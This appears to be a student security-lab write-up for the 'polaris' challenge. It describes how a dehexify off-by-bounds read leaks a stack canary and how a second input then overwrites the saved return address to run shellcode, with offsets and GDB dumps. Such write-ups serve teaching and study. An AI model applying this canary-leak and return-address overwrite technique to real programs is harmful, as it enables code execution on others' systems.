# 03 - polaris  Writeup

## Main Idea

top of stack

0xffffd68c  RIP
compiler  pad
0xffffd66c  c.buffer
0xffffd65c  c.answer

stack pointer

The branch in line 25 `if (c.buffer[i] == '\\' && c.buffer[i+1] == 'x')` is vulnerable.
The BUFLEN = 16, when the buffer[12] == '\' and  buffer[13] == 'x', `i` will jump into 16, which is out of the buffer.
And the value in stack will be written into c.answer, and We can get it.

The canary will be the same when the program is running.
We can get the canary from the first stdin and stdout.
And use the canary and overwrite the RIP in the second try.

## Magic Numbers

The address of buffer is `0xffffd66c`, the RIP is `0xffffd68c`, so the location of RIP is 32 bytes away from the start of the buffer.

``` C++
(gdb) x/16x c.buffer
0xffffd66c:     0x00000000      0x00000000      0xffffdfe1      0x0804cfe8      
0xffffd67c:     0x21908aac      0x0804d020      0x00000000      0xffffd698
0xffffd68c:     0x08049341      0x00000000      0xffffd6b0      0xffffd72c      
0xffffd69c:     0x0804952a      0x00000001      0x08049329      0x0804cfe8      
(gdb) i f
Stack level 0, frame at 0xffffd690:
 eip = 0x804922e in dehexify (dehexify.c:22); saved eip = 0x8049341
 called by frame at 0xffffd6b0
 source language c.
 Arglist at 0xffffd688, args:
 Locals at 0xffffd688, Previous frame's sp is 0xffffd690
 Saved registers:
  ebp at 0xffffd688, eip at 0xffffd68c
```

## Exploit Structure

We can run this program many times to determine the position of stack canary in 0xffffd67c. 
Here is the stack diagram.

The exploit has two tries:

The first try:

1. Write 12 dummy characters to overwrite `buf`
2. Write "\\x\n", the program will jumpy into the canary.
3. Receive the answer, and canary will be in answer[13:17],  [0:12] means pad, [12] means \\x dehexify, [13:17] means canary, and save canary in python string.

The second try:

1. write 16 dummy characters to buffer
2. write canary
3. write 12 pad, and the RIP will sit in the next byte.
4. overwrite the RIP with magic-code, "\x90\xd6\dff\xff", which is the RIP address('0xffffd68c') + 4 
5. write SHELLCODE.

## Exploit GDB Output

When we ran GDB after inputting the malicious exploit string, we got the following output:

```C++
(gdb) x/16x c.buffer
0xffffd66c:     0x41414141      0x41414141      0x41414141      0x00414141
0xffffd67c:     0x3ae2fc37      0x42424242      0x42424242      0x42424242
0xffffd68c:     0xffffd690      0xdb31c031      0xd231c931      0xb05b32eb
0xffffd69c:     0xcdc93105      0xebc68980      0x3101b006      0x8980cddb
```

